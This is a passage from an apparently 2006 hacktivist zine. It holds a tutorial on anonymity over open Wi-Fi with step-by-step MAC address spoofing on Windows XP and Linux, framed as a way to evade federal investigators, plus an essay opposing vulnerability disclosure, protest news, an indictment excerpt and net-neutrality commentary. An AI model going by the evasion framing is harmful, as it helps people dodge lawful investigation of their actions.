Address in question at the specified time. With this\r\ninformation the Feds would probably proceed to confiscate and fingerprint the\r\nequipment, and check any video surveillance to determine who was using the\r\nterminal at the time. It may be that the Feds get nothing from this information,\r\nbut did our anarchist really need to take that risk? \r\n\r\nLuckily, there are better ways. One of these came with the advent and\r\nproliferation of wireless networks. They're everywhere these days, in homes,\r\ncafes, corporate offices, anywhere you can think of. Many of these networks are\r\ntotally wide open for the public to use.\r\n\r\nUsing a wireless network offers some strategic advantages to someone seeking\r\nanonymity on-line. First, because the user is not bound by wiring, they can be\r\nphysically distant from the actual internet connection. Right now, for example,\r\nthe author is using a home-made antenna to covertly steal internet access from\r\nthe neighbor down the street. An additional benefit comes from the network\r\narchitecture typically used in a wireless network. Remember how I said an IP\r\nAddress consists of four numbers ranging from 0 to 255? Well, this means that\r\nthere are a limited number of IP Addresses available. Considering that the\r\ninternet is a world- wide resource, this number is actually relatively low.\r\nBecause of this fact, a system was developed whereby multiple computers could\r\nshare one IP Address. For the record this is known as Network Address\r\nTranslation. A system set up with NAT consists of a computer that has a real IP\r\nAddress, known as the server, and a number of computers that have fake\r\naddresses, known as the clients (these addresses tend to be 10.x.x.x or\r\n192.168.1.x; where ‘x' is a number 0 - 255, but they need not be). The server\r\nreceives requests for internet content from the clients and then requests that\r\ninformation from the internet, when the internet responds with the requested\r\ncontent, the client determines which client asked for it, and then sends it to\r\nthat computer. The important thing to note is that any client under such a\r\nsystem has no unique IP Address, and most wireless networks use this kind of\r\nsetup! \r\n\r\nSo, let's revise our example above. This time the anarchist uses a laptop to\r\naccess an unprotected wireless network made available by a public library. In\r\norder to avoid suspicion and detection she accesses the network from a bench\r\nwell out of site of surveillance cameras in the public park next to the library.\r\nWhen the Feds get wind of it, they will, once again, be able to trace the\r\ncommunications to the library. This time, however, the library's computer\r\ntechnicians won't be able to tell the feds much because they have a publicly\r\navailable wire- less network, and the feds will gain little from surveillance\r\nfootage. Quite an Improvement! \r\n\r\nMAC ADDRESSES\r\nAlas, this second scenario is still not good enough. That is because of a\r\nnefarious little piece of information known as the Media Access Controller\r\nAddress, or MAC Address. The MAC Address - sometimes referred to as the Network\r\nAddress or Physical Address - is a number that is intended to uniquely identify\r\nthe piece of hard- ware you are using to connect to a network. If an IP Address\r\nwere the license plates on a car, then the MAC Address would be the VIN number.\r\nEvery piece of network hardware, including your wireless adapter, has a MAC\r\naddress, and unlike an IP Address, this unique identifier is passed on and\r\nrecorded even across a network using NAT. Luckily, it is nearly impossible to\r\ntrack a known MAC Address to the person that owns that piece of hardware. It is\r\npossible, however, for an investigator to compare a known MAC Address to the MAC\r\nAddress on any Network Interface Cards a suspect might own. \r\n\r\nSo, in the example I just gave, our anarchist may not get off altogether. Since\r\nthe author of the communi- que made no effort to conceal her MAC Address, the\r\nfeds will learn it. Let's say that our protagonist lives in a relatively small\r\ntown, and is known to belong to a small community of anarchists there. Our\r\nanarchist may come under suspicion for the actions claimed in the communique\r\njust by virtue of already being on the law enforcement's radar. If this is the\r\ncase, the investigators are likely to confiscate this person's computer and\r\ncheck the MAC Address to the one used to issue the communique. When they find\r\nthat they are a match, our friend could get in some serious trouble. All is not\r\nlost though, with a bit of knowledge and practice, one can learn to hide their\r\nMAC Address. \r\n\r\nHIDING ONE'S MAC ADDRESS IN WINDOWS XP\r\nThe process for changing one's MAC Address in windows is relatively straight-\r\nforward, but first-timers and/or those intimidated by computers may find the\r\nprocess baffling at first. I urge you, the reader, to look over these step-by-\r\nstep instructions and their accompanying diagrams several times. After you think\r\nyou have it down, be sure to practice a few times before you need to do it in a\r\n\"real-world\" situation. \r\n\r\nStep 1: To give you a feel of what we're going to do, go to Start->\r\n        Programs-> Accessories-> Command Prompt. A box with some text and a\r\n        blinking cursor should come up. Type this command ipconfig /all. You get\r\n        a bunch of information regarding your network connections. Somewhere in\r\n        this information will be a line that reads \"Physical Address...\" (See\r\n        figure 1). This is your current MAC Address, write it down for\r\n        reference. It will be a series of 6 numbers represented in hexadecimal\r\n        format (this means that a digit can be 0 through 9 or a through f where\r\n        a through f represent 10 through 15). Our goal is to replace these\r\n        numbers with different ones. In order to do this we need to edit the\r\n        registry. \r\n\r\nStep 2: The registry is a repository of data that is used by the operating\r\n        system. Typically the user needn't worry about it at all. In windows we\r\n        can edit this data by using the regedit program. Click Start-> Run. A\r\n        text box will pop up type \"regedit\" (figure 2) and hit okay. The\r\n        registry program will open (figure 3).\r\n\r\nStep 3: Look at figure 3. On the left side of the window you will see various\r\n        expandable folders. These work just like the file browser included in\r\n        windows. Folders open up to new folders in an expandable tree. The\r\n        difference is that these folders contain different keys and each key\r\n        contains different data. \r\n\r\n        The data we want to change can be found in the key located at:\r\n        [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E972-E325-\r\n        11CE-BFC1-08002bE10318}]. To get there click on the little plus sign\r\n        next to \"HKEY_LOCAL_MACHINE\" then the one next \"SYSTEM\" and so on until\r\n        you find the {4D36E972-E325-11CE-BFC1-08002bE10318}folder. Click on the\r\n        plus next to this folder and you will see a number of subfolders that\r\n        run in sequential order. When you are done with this step, the tree on\r\n        the left side of the regedit window should look something like figure 4.\r\n\r\nStep 4. Each of these folders represents a different network device. In order to\r\n        determine which one correlates to the network card you want to change\r\n        the MAC address on, you will have to click on each one. After you click\r\n        on each of these subfolders, examine the data that appears in the box on\r\n        the right. You should find some lines with descriptive information such\r\n        as the manufacturers name. You will need to find a match for your card.\r\n        Usually you can find manufacturer and model information printed on your\r\n        card. Continue look- ing through the sub-folders until you find a match.\r\n        On my computer under folder 0016 I find a string entitled \"ProviderName\"\r\n        and its corresponding value is \"Lucent Technologies\" and there's another\r\n        string called \"Ven- dorDescription\" and its value is \"ORiNOCO PC Card (5\r\n        volt).\" These clues tell me that this folder is for my Lucent\r\n        Technologies Wavelan pc card which is based on an ORiNOCO microchip. \r\n\r\nStep 5. When you have found a match, look in the window on the right under the\r\n        \"name\" column for a string called \"NetworkAddress.\" If none exists, you\r\n        will have to create it. Right-Click in the box on the right and click\r\n        New-> String Value. Name this string \"NetworkAddress.\" \r\n\r\nStep 6. Now, all you have to do is give \"NetworkAddress\" a value, or alter the\r\n        value already there. Double click on \"NetworkAddress\" and in the value\r\n        field enter a string of 12 characters ranging from 0 to 9 and a through\r\n        f, eg. 022CDEAD4e2c. (Figure 6) \r\n\r\nStep 7. Close the regedit program and restart your computer.\r\n\r\nStep 8. Let's see if this worked. Open a command prompt (Start-> Programs-> \r\n        Accessories-> Command Prompt) and type ipconfig /all. You should see\r\n        that the fake MAC Address your provided is displayed.\r\n\r\nStep 9. If your MAC Address did not change, or if your internet connection\r\n        ceases to work, you may have provided an invalid MAC address. Another\r\n        possibility is that there are more than one entry in the registry for\r\n        your wireless card, look through the subfolders under\r\n        [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E972-E325-\r\n        11CE-BFC1-08002bE10318}] again and see if there's another folder that\r\n        describes your card. In either case repeat steps 2 through 8. Once you\r\n        see that your \"Physical Address\" has changed by issuing the ipconfig\r\n        /all command in the command prompt you are done.\r\n\r\nStep 10. Send your communique, or do whatever thing it is that you don't want\r\n         the feds to know about.\r\n\r\nStep 11. Repeat steps 2 through 9 to change your MAC Address again.\r\n\r\nHIDING ONE'S MAC ADDRESS IN LINUX\r\nFor anyone using the LINUX operating system,4 the process of changing MAC\r\nAddresses is fairly simple. I am going to assume that the reader already has a\r\nrunning LINUX machine with a functioning wireless adapter. If this is not the\r\ncase, there are numerous resources online that can help in this regard. Please\r\nnote, that some of these steps may vary slightly given different LINUX\r\ndistributions and wireless cards. \r\n\r\nStep 1.  Open a terminal. This process will be different for all distributions\r\n         of LINUX. Most LINUX distributions now default to a graphical user\r\n         interface that includes a desktop, icons, and other doodads. Typically\r\n         there will be some sort of application menu. If you can find this, look\r\n         for terminal, xterm, konsole,or some- thing of the sort. If all else\r\n         fails consult the web site of the distribution you are using. \r\n\r\nStep 2.  Type the iwconfig command in the terminal window and hit enter. You\r\n         will see various information regarding your wireless device and any\r\n         network it may be connected to (see figure 8). Note the name of the\r\n         device on the left side. In my case, my wireless device is named \"eth1\"\r\n         this may vary depending on your setup. \r\n\r\nStep 3.  Now type ifconfig and hit enter. Ifconfig will display a variety of\r\n         network information (see figure 9), but what we are worried about is\r\n         the string that follows \"HWaddr\" this is the device's MAC Address.\r\n         Write this down for reference.\r\n\r\nStep 4.  Turn off your wireless adapter. This is typically done by issuing the\r\n         ifdown <device name> command. (See figure 10)\r\n\r\nStep 5.  Change your MAC Address by issuing the following command: ifconfig\r\n         <device name> hw ether xx:xx:xx:xx:xx:xx where each x is a digit from\r\n         0 to 9 or a to f. (see figure 10)\r\n\r\nStep 6.  Turn on your wireless adapter. This is typically done by issuing the\r\n         ifup <device name> command.\r\n\r\nStep 7.  Check your work. Issue the ifconfig <device name> command again. You\r\n         should see that the MAC Address has changed. If this is not the case,\r\n         or if your internet connection stops working, you may have entered an\r\n         invalid MAC Address. Repeat steps 4 through 7 until it works.\r\n\r\nStep 8.  Send your communique or do whatever you want.\r\n\r\nStep 9.  Change your MAC Address again by repeating steps 4 through 7.\r\n\r\n\r\nQuestions? Comments? Article Submissions?

This includes: printing your own copies \r\nto distribute to friends and family, copying and pasting bits of text in your\r\nown works, mirroring electronic versions to websites and file sharing services,\r\nor anything else you could think of - without asking permission or apologizing!\r\n\r\n\r\nThe Summer '06 issue of the zine has possibly our best collection of articles\r\nyet and is published in full color in time to distribute at our vendor table and\r\nguerrilla workshop at the sixth Hackers On Planet Earth conference in NYC.\r\n\r\nMind you, this was no easy feat, in fact it was through a series of miracles\r\nthat we had ended up in NYC at all. The night before we hit the road we still\r\nhad a lot of editing to do on the zine, not to mention printing copies. So to\r\ncelebrate we decided to hold an acoustic show and trip on psychedelics all night\r\nlong. Around 10 in the morning reality started to creep back up on us and we\r\nspent many long hours hopped up on caffeine trying to arrange the pages of the\r\nzine while packing our HOPE supplies. We were quite literally finishing up the\r\nPDF on the road to NYC while driving eight people in a single car. Not to\r\nmention that one of us had to ask permission from the judge to leave the state\r\nto go to the hacking convention while facing federal felony hacker charges!\r\n\r\nAt last we had made it to NYC to the convention site and immediately set up our\r\ntable and met up with several other Hackbloc'ers/HTS'ers waiting for us.  We had\r\nto make several printing runs because each time we had brought new materials to\r\nthe table they had been taken within fifteen minutes. All of the propaganda we\r\nwere giving away, including new and old HTS zines, cds of the\r\nDisrespectCopyrights.net file archive, newsletters for the People's Free Space,\r\nand other posters pamphlets and propaganda, were given away for free. This is an\r\namazing feat considering the time energy and resources we have put into\r\ndeveloping this, also considering that this year they were asking us for $250 to\r\ntable while at the Fifth HOPE we had tabled for free.\r\n\r\nWe had also organized a guerrilla workshop on hacktivism on Sunday. Unlike most\r\nof the other presentations and lectures, we arranged chairs in a circle so that\r\nwe could have a round table collective meeting where everyone was welcome to\r\nparticipate without any top down hierarchy. Dozens came to have focused\r\ndiscussion on past and present examples of hacktivism, setting up hacker spaces\r\naround the country, security culture both on the internet and in our\r\norganizations, and future goals of hacktivism. We also discussed the various\r\nmeanings and interpretations of the word Hacktivism, including prankster culture\r\njamming hacktivism such as the Yes Men, online civil disobedience such as the\r\nElectronic Disturbance Theatre, fighting censorship such as the Hacktivismo\r\nproject, developing a free and secure internet such as Tor, Freenet, and\r\nGuerrillanet, the need to set up computer co-ops and offer free internet and\r\ntechnology for the public, and defending free speech and open publishing systems\r\nsuch as IndyMedia.\r\n\r\nCompared to the hacktivist movement worldwide which already has a network of\r\nseveral dozen hacker spaces and squats, we still have a lot of work to do.\r\nHowever, during the weekend we had made several valuable contacts and had\r\ndeveloped several ideas for future hacktivist related projects. Although we have\r\na long road ahead, our experiences with HOPE has given us inspiration and the\r\nopportunity to learn and share with other hackers and activists from around the\r\nworld.\r\n\r\n\r\n                     !####################################!\r\n                     !####    TABLE OF DISCONTENTS     ###!\r\n                     !####################################!\r\n                                                \r\n                               -NEWS and INTRO- \r\n                  Zen and the Art of Non-Disclosure      - 01\r\n                  Anti-DRM Flash Mob                     - 02\r\n                  U.S gov.

Zen and the Art of Non-Disclosure                     #\r\n################################################################################\r\n\r\n As hackers, squatters, scammers and phreaks, we are often asked, \"That's\r\namazing, how do you do it?\" Yes, there still is magic out there, but it's not\r\ngoing to find you, nor will you find it through a google search*.\r\n\r\n It's a vulnerability so long as the vendor isn't informed and releases a patch;\r\nit's a squat so long as it's \"legal owner\" doesn't find out and kicks you out;\r\nand it's an underground party so long as no one slips up and police raid the\r\nplace. Same goes for sneaking into theatres, copy hookups, and other scams.\r\n\r\n How do we keep these tricks alive? By keeping them a secret only to those who\r\nneed to know. A magician never reveals her secrets lest it will cease to be\r\nmagical. You will likely never hear the magician's true name either. \r\n\r\n Why do people publicly release these tricks in the first place, and what\r\neffects does this have? Those vulnerable to the trick will likely find out and\r\npromptly patch their weaknesses. And law enforcement will have an opportunity to\r\nlearn and train themselves as well as find out who to bust. Or the trick will\r\nfall into the wrong hands and be counter-productive (script kiddies, right\r\nwingers, fascists, etc). \r\n\r\n All so you can get your name on some security list as the one who \"found it\r\nfirst\", and in all probability, you probably weren't the first anyway, as the\r\nreal people who made the discovery would want nothing to do with such lists to\r\nbegin with. And they probably have a billion more important ways of applying the\r\ntrick in the first place. \r\n\r\n So before you spill the beans, ask yourself whether there are people who need\r\nthese tricks more than you do, or whether there are already such people at work\r\nand would full disclosure jeopardize their secret plans?\r\n  That being said, we can move on to more pressing issues: how can we help the\r\nhacker movement to learn and grow without giving away and spoiling all our\r\ntricks? This was the big question as we were putting together this issue of our\r\nzine, thinking about whether we should publish instructions on 'how to hack X\r\nand hack Y'. Certainly we don't want to become some \"eliter than thou\" clique\r\nbecause it again becomes about individual ego and not the community, and while\r\nindividuals come and go, ideas last forever. So we have to train ourselves and\r\nothers willing to learn, but find a way to do it in a carefully calculated\r\nmanner. And it's not gonna happen by giving away proof-of-concept code but by\r\nteaching the approach and technique so people can figure it out for themselves.\r\n\r\n I don't think that was our conscious goal of Hack This Site but it certainly\r\nwas the result. We wanted to introduce people to the wild world of hacking so we\r\nput together several series of hacking challenges modeled after real websites\r\nwith real vulnerabilities. Creating this safe and legal training front group*,\r\npeople were able to jump in and start with the basics, not by downloading\r\nexploits or \"appz\", but by hands-on security research. People sometimes give us\r\nshit because we're dominated by newbies or that we are aiming too low. Rest\r\nassured, there are plenty of us with skill waiting in the background waiting for\r\nYOU to start asking the right questions so the real training can begin. Yes, we\r\nwant to share our shit with those who want to learn.\r\n\r\n Before you can walk, you have to learn to crawl. And when you can walk you can\r\nbe shown the path. And this is what every white-hat, security consultant, or\r\nfull-disclosure advocate fails to see: we can show you the path, open the door,\r\nand offer you the red pill, but you have to take that first step and become that\r\nblack hat hacktivist ninja.\r\n\r\n Cause you're not helping anybody when you alert the vendor or post that 0day\r\nproof of concept code.\r\n Or get that full time computer security job for the phone company.\r\n Or turn in your buddies to the FBI when the going gets tough.\r\n\r\n This is what is known and loathed as \"selling out\", and it helps nobody but the\r\nforces which are working to destroy the hacking movement. The people who are\r\nseduced into it either end up regretting it or lose a bit of their humanity in\r\nthe process of becoming a zombie worker bee for the Establishment.\r\n\r\n So you've gone this far, but where are we going and what do we do next? You've\r\nprobably realized this world isn't a very friendly place for not just black hat\r\nhacktivist ninjas but for most people in general, unless you happen to be in\r\nthat top 1% where you have your own mansion, private jet and congressman. Every\r\nday we hear about how hackers and activists are criminals and terrorists. If you\r\nwatch television you are also probably tired of hearing about how illegally\r\ntapping your phone or reading your mail protects os from terrorism, or how\r\nanother thousand dead babies in Iraq is a Strong Victory for Worldwide\r\nDemocracy. So instead of boring you and further let me encourage you to Turn Off\r\nThat Television and Get Involved with your Community cause Now is the Time to\r\nAct:\r\n \r\n \r\n¥ get involved with your local indymedia center to tell the stories corporate\r\nmedia ignores\r\n¥ set up servers for radical websites and email lists and teach them how to\r\ncommunicate securely on the internet\r\n¥ find ways to get shit for free(free copies, free internet, free public\r\ntransportation, etc) and share it with those who need it the most\r\n¥ help develop the next Internet, one that is free from NSA spooks, traffic\r\nshaping, hierarchal domain authorities, or corporate control in general\r\n¥ help inspire those who will grow to be bigger stronger and smarter than you or\r\nI who will deal that final blow against capitalism and the state\r\n\r\n There is still magic out there for those who seek it: don't wait for it, it\r\nwaits for you!\r\n\r\n################################################################################\r\n#           02. Anti-DRM Flash Mob Hits Apple Stores in Eight Cities           #\r\n################################################################################\r\n\r\nIn a coordinated action at 8 cities across the United States, technologists\r\ndonned bright yellow Hazmat suits and swarmed Apple Stores, warning shoppers and\r\nstaff that Apple iTunes is infected with Digital Restrictions Management (DRM)\r\nand that Apple's products are defective by design.\r\n\r\nThe technologists displayed posters mocking Apple's marketing campaign, with\r\ngraphic images of a silhouetted iPod users bound by the ubiquitous white earbud\r\ncord. The group claim that as the largest purveyor of media infected with DRM,\r\nApple have paved the way for the further erosion of users' rights and freedoms\r\nmade possible by the technology.\r\n\r\nThe coordinated protest was organized by DefectiveByDesign.org, a direct-action\r\ncampaign targeting Big Media and corporations peddling DRM. \"In the 17 days\r\nsince the launch of the campaign we have had more than 2,000 technologists sign\r\nthe pledge to take direct action and warn people about DRM\" was how campaign\r\nmanager Gregory Heller described the explosive grassroots effort.\r\n\r\n\r\nAbout a dozen activists gathered in Chicago at the Apple store on Michigan Ave,\r\nthe busiest shopping area of Chicago, to protest Apple's use of Digital \"Rights\"\r\nManagement technology. Members from the local Chicago Linux Users Group\r\n(chicagolug.org), Free Software Foundation(fsf.org), Defective By\r\nDesign(defectivebydesign.com), and Hackbloc Chicago(hackbloc.org/chicago) had\r\nhelped organize the event by bringing bio-hazard suits, anti-DRM signs and\r\nstickers, and posters of people getting roped up by their iPod cords mocking the\r\nofficial Apple ads. Shoppers stood in awe and curiosity as we ran around the\r\nfront of the store in a panic, handing out flyers and otherwise creating a\r\npublic spectacle. Several Apple employees gathered by the front entrance of the\r\nstore preventing us from entering the store while refusing to comment on Apple's\r\nuse of DRM technology.\r\n\r\nMore information, see www.defectivebydesign.com or www.fsf.org\r\n\r\nPirate Party Condemns Raid on File Sharing Servers\r\nJune 3rd, 2006: Pirates gather in Stockholm to protest the May 31st police raid\r\non over a hundred servers related to The Pirate Bay, Piratbyryn, and more.\r\nDemonstrators demanded that the Swedish government should seek a comprimise on\r\nthe file sharing issue rather than criminalizing more than a million Swedish\r\ncitizens.\r\n\r\n################################################################################\r\n#                 03.  US Government Indicts Hacker Activist:                  #\r\n#                 Felony Computer Fraud and Abuse Act Charges                  #\r\n################################################################################\r\n\r\nThe US District Attorney and the FBI has pressed felony charges against Jeremy\r\nHammond, hacker activist and founder of website HackThisSite.org, related to the\r\nalleged hacking the website of the right-wing hate group ProtestWarrior.com. The\r\nindictment issued on June 26, 2006 follows an FBI investigation lasting more\r\nthan a year since Jeremy's apartment was raided in March '04 and accuses him of\r\nviolating the Computer Fraud and Abuse Act.\r\n\r\nThe US DA alleges that Jeremy was involved with a hacker group known as the\r\nInternet Liberation Front that allegedly hacked into and gained access to the\r\nentire database belonging to the right-wing hate group ProtestWarrior.com.\r\nOriginally, ProtestWarrior has baselessly accused Jeremy of 'intending' to use\r\ncredit card data to make donations to leftist and charity groups, although the\r\nFBI is not making any accusations related to intending or actually using credit\r\ncard data.\r\n\r\nDespite that no damage has been done to the ProtestWarrior.com server, nor has\r\nany personal details or credit card information has been released or used,\r\nJeremy is facing serious felony charges which could result in jailtime and\r\nmassive fines.\r\n\r\nJeremy is still \"free\" on a unsecured bond which imposes several strong bail\r\nconditions which includes submitting to regular drug testing, surrendering the\r\nright to a passport or leaving the state without the judges permission, and no\r\nuse of the computer / internet except for \"web designing for business purposes\"\r\n\r\nJeremy has not testified against, provided evidence, or incriminated anyone else\r\nand has not cooperated with the FBI in any investigation or prosecution. He is\r\nthe only one who has been arrested in connection with this alleged hacking\r\nindicent.\r\n\r\nIronically enough, a former friend and administrator who had helped Jeremy work\r\non the HackThisSite.org website was responsible for informing ProtestWarrior.com\r\nof the attack and has provided so-called evidence to the right-wing group which\r\nwas engineered to make Jeremy look like the perpetrator of the alleged hacking\r\nincident. This is apparently what was responsible for the initial search warrant\r\non his apartment, and if brought up as evidence during the trial, will hopefully\r\nbe thrown out on grounds of heresay due to the chain of custody.\r\n\r\nAt the most recent court date, the DA asked Judge Zagel to formally admonish\r\nJeremy for his history of criminal behavior, most of which has involved minor\r\nmisdemeanors for political protest related events. Following a recent arrest for\r\n'chalking sidewalks', the judge warned Jeremy that any future arrests would\r\nresult in either home confinement with electronic surveillance on his dollar, or\r\ncompletely revoke his bail and put him in jail until the results of the trial.\r\nAs the Judge describes, Jeremy \"no longer has the same freedoms\" he once held.\r\n\r\nJeremy is now staying out of any direct action or illegal activities and major\r\nprotests which could result in arrestable situations, both for his safety and\r\nthe safety of others. After a 10 day Vipassana meditation course, he is also\r\nseeking mediation which those who he has wronged, or those who currently have\r\nissues with him, with the intent of resolving political issues in the community\r\nas well as for his personal development.\r\n\r\nWhile federal prosecuters claim that this is being treated as a standard\r\ncriminal charge, it is obvious that this is a politically motivated trial as the\r\namount of money the FBI has spent investigating and prosecuting this 21 year old\r\nactivist doublessly exceeds the next-to-no damages done to the right-wing\r\nProtestWarrior.com website.\r\n\r\nAs an activist who has worked to help and teach people all his life, we ask the\r\nfederal prosecutors and the judge that Jeremy not be given any jailtime for a\r\n'crime' that has resulted in no damage to any property or person.\r\n\r\n\r\nfull text of the indictment:\r\nUNITED STATES DISTRICT COURT \r\nNORTHERN DISTRICT OF ILLINOIS \r\nEASTERN DIVISION \r\n\r\nUNITED STATES OF AMERICA vs JEREMY A HAMMOND \r\n\r\nViolations: Title 18, United States Code, Sections 1030(a)(2)(C) and 2 \r\n\r\nCOUNT ONE  SPECIAL FEB 2005 GRAND JURY charges:\r\n\r\n1.

Visitors to the ProtestWarrior.com website could become members\r\nof the website, and could purchase items and make donations through an online\r\nstore using a credit card. As a result, the ProtestWarrior.com computer server\r\ncontained databases that included personal information about visitors to the\r\nwebsite, including credit card account information, home addresses, names, and\r\nother identifying information. These databases on the computer server were not\r\navailable online to the general public.

Fear, Paranoia and Mental Health for Hacktivists             #\r\n################################################################################\r\n\r\n \"There is this thing keeping everyones lungs and lips locked, it is called fear\r\nand its seeing a great renissance.\" -The Dresden Dolls\r\n\r\nEvery day I woke up with an overwhelming sense of dread. I couldn't leave my\r\nbed, I was locked in my head, locked in my a room of my own making in my mind.\r\nTrapped in a cage that I could not get out of. Fear had finally consumed me,\r\nalong with its twisted cousin paranoia. I new that I had to get out of this\r\nstate, this room. I couldn't get out of my own head though, there has never been\r\na jail more unescapeable than the one within our own minds. What happened to me\r\nis not an uncommon story. It happens all the time to hackers and activists and\r\nanarchists. We have the virtue of seeing many of the things that are really\r\ngoing on. There are some scary things happening in the world and there are some\r\ntruly sad things. But we can never let fear consume us.\r\n\r\nFEAR AS A FORM OF SOCIAL CONTROL\r\n\r\nThe greatest example of the forces that controll the world using fear to\r\nstrengthen there controll would be \"The war on *\". Any war only serves to spread\r\nfear further throught the world whether it be a war on communisim, a war on\r\ndrugs, a war on terrorisim or the coming war on freedom. Dont support war no\r\nmatter what the cause! And dont support fear either, coming from any source.\r\nUnfortunately sometimes even the best of us can get too run down from dealing\r\nwith everything from the bullshit of daily life to the sometimes unbarable\r\nsaddness of reality. The isolation of sitting in front of a computer screen for\r\nhours every day can draw you into fear and paranoia as well as constantly\r\nsurronding your self with people. Like I said, it happens to all of us so here\r\nare some tips to keep your sanity and keep active!\r\n\r\nDont isolate yourself\r\nIf you are starting to feel overwhelming depression, don't isolate yourself! Go\r\nfind a trusted friend and let them know how you are feeling. Interact with\r\nsomeone, even if it is only for a couple hours. Your friends can help you ground\r\nyourself and get into a healthier state of mind.\r\n\r\nOk so sometimes maybe you should isolate yourself\r\nSometimes there are too many people around in your everyday life and you need to\r\nget away, this can easily happen in large shared living spaces as well as for\r\nthose who just work on a lot projects. Sometimes it is good to go out in the\r\nwoods and camp for a few days. Go remember why you are working for a better\r\nworld and what you are doing, who you are.\r\n\r\nLove yourself and others\r\nThis is probably the most important point that I can make. As I said, the\r\ngreatest weapon of those in power is fear. The best way to fight fear is love.\r\nAlways remember to love yourself. And make love to yourself. And also, if you\r\nlove yourself, love others! If you love your self and others than you will have\r\na much easier time coming back from a nervous breakdown or depression because\r\nyou will always know that you have yourself and those that you love.\r\n\r\nThere are lots of amazing things happening right now and every day. The forces\r\nof capitalisim are waning. They are falling and will continue to fall only as\r\nlong as we keep changing the world. We can't change the world if we are locked\r\nin paranoia and fear so we must keep sane and stay in touch with the world and\r\nin love.\r\n\r\n** Eye on Big Brother **\r\n\r\n* FBI Seeks to Expand Network Tapping Capabilities\r\nThe FBI is trying to expand the Communications Assistance for Law Enforcement\r\nAct(CALEA) to have greater electronic surveillance capabilities. If passed, the\r\nbill would force manufacturers of common networking devices(ethernet hubs,\r\ntelephone switches, wifi routers, etc) to develop modifications and upgrades\r\nthat integrate built-in backdoors that allow law enforcement or others to\r\nmonitor traffic.\r\n\r\n* EFF battles Unconstitutional Warrant-less NSA Spying on All Americans\r\nWith the cooperation of major telecommunication corporations, the NSA has\r\nlaunched a massive electronic surveillance system to monitor and analyze the\r\ninternet and telephone traffic of millions of Americans. While these\r\nunconstitutional warrant-less searches are illegal, the NSA has been given the\r\ngreen light by Bush personally, which demonstrates a frightening collaboration\r\nby private corporations, law enforcement, and the executive branch. An AT&T\r\ntechnician himself who had helped in building these 'secret rooms' for the NSA\r\nis now working with the EFF in testifying against his former employer in a\r\nlawsuit demanding that AT&T stop illegally disclosing it's customers'\r\ncommunications to the government. The battle is still in the courts where the US\r\nGovernment has filed a motion trying to dismiss the EFF's suit claiming that any\r\ninvestigation into whether AT&T broke the law could \"reveal state secrets and\r\nharm national security\".\r\n\r\n################################################################################\r\n#                           05. How the Net was Lost                           #\r\n################################################################################\r\n\r\n \"When people ask me if I work in the public or private sector, I never know to\r\nrespond, as I simply work in solidarity in the human sector\"\r\n\r\n Those who currently struggle to maintain what is called \"Net Neutrality\" on the\r\ninternet I think have taken too limited an approach to their struggle. What they\r\nask is to maintain an existing status quo that had already been eroded from the\r\noriginal promise and potential of the internet against those who wish to change\r\nit even further. This to me leaves for a poor negotiating position when congress\r\nloves to bridge difference with half measures, and even limited compromise\r\nbetween the current status quo and proposed changes would still be disastrous.\r\nThis would be much like North American civil libertarian's discussing which of\r\nthe remaining of the first 10 amendments they will be forced to accept being\r\ndiscarded versus those they think they can still actually preserve. This to me\r\nis a long term losing position to occupy.\r\n\r\n In the beginning, the internet was a peering arrangement where all nodes were\r\ntreated equally, and anyone could interconnect from any one node to another.\r\nThis was the network of peering built upon public standards that anyone could\r\nfreely implement. Other commercial networks also existed, some built on the\r\nlayered OSI model. All, however, were implemented in some proprietary fashion,\r\nor otherwise built around some controlling model of centralized traffic routing,\r\nrather than that of essentially equal peers, and as a result diminished over\r\ntime.\r\n\r\n The internet eventually spread to the general population through modem dialup.\r\nThis changed the internet from being a semi-closed environment connecting just a\r\nfew hundred or thousand commercial and government institutions into something\r\ninterconnecting millions. The speeds and bandwidth of analog modem dialup\r\nnaturally limited what individuals could do over dialup links, but outside of\r\ntechnological limitations, the internet imposed no additional discriminatory\r\npractices nor did those ISPs who offered direct internet access through dialup\r\nat the time. While closed garden proprietary dialup service providers like Game\r\nMaster, CompuServe, and America Online, came and went, people remained free to\r\nuse direct dialup networks for both consuming and producing content on a peer\r\nbasis. There was a time in fact that I ran my own domain and mail servers out of\r\nmy own location on a dialup connection.\r\n\r\n With the widespread introduction of broadband, over cable and DSL, came the\r\nfirst real discrimination on the internet. Just when finally there was enough\r\neasily deliverable bandwidth to go around to enable the millions of dialup users\r\nto more directly participate on the internet, it was closed off from them. At\r\nthe physical layer, peering was closed by artificial uplink \"bandwidth caps\",\r\nwhich restricted their ability to produce and distribute. At the application\r\nlayer, broadband providers actively discriminate by blocking certain ports and\r\nservices, particularly in regard to email. At the legal layer, broadband service\r\nagreements offered through monopoly telco and cable companies restrict what\r\nservices and applications people can run.\r\n\r\n Even during the age of dialup, when bandwidth was scarce except for a few\r\nlocations, a model for service hosting and co-location appeared. This allowed\r\nsomeone who had a peering agreement, which already was very expensive, to then\r\ndistribute and share the cost of bandwidth by renting space and/or servers on a\r\nrack to others. With the introduction of capped, application layer and legally\r\nrestricted broadband, hosting became the last refuge for what the original\r\ninternet was about; peering by equals.\r\n\r\n This division between consumers and producers means only a limited few are\r\nprivileged to directly publish on the internet. YetÑeven though they pay\r\nconsiderably more for that privilege and their connectivity already, and even\r\nthough consumers pay directly for their connectivity as wellÑthe current\r\ninternet backbone peer providers wish to collect additional charges, and\r\notherwise artificially constrain traffic to hosting facilities and companies as\r\nthey please, much like they do with those they consider consumers. The death of\r\ninternet peering means that hosts will be billed based on their popularity as\r\nwell as the bandwidth they consume and have paid for. It also reduces all\r\nhosting arrangements into a question of pure economic value, rather than\r\nconsidering the social value of sites that exist for non-commercial purposes or\r\nthat otherwise do not charge. Finally, the death of Net Neutrality means\r\nproviders could selectively choose to make some sites (commercial competitors,\r\nthose who publish information that they disagree with, etc) entirely unreachable\r\nif they so choose.\r\n\r\n The internet flourished and grew precisely because nobody was in control of\r\ntraffic. That millions now are classified as passive consumers already is an\r\naffront to the dream of an active community where everyone has opportunity to\r\nparticipate and publish. The remaining struggle over Net Neutrality today is\r\nsimply one of how small and how privileged a minority will still retain the\r\nability to publish, and hence how much it will cost to still exercise former\r\nrights as reclassified as a limited privilege at the discriminatory whim of a\r\nfew large corporations.\r\n\r\n The internet today is already divided between a large number who are only\r\nallowed to consume and a small number who are permitted to produce. Rather than\r\nsimply fight to preserve this already unequal status quo, it would be far better\r\nto challenge it by fighting to actively restore the 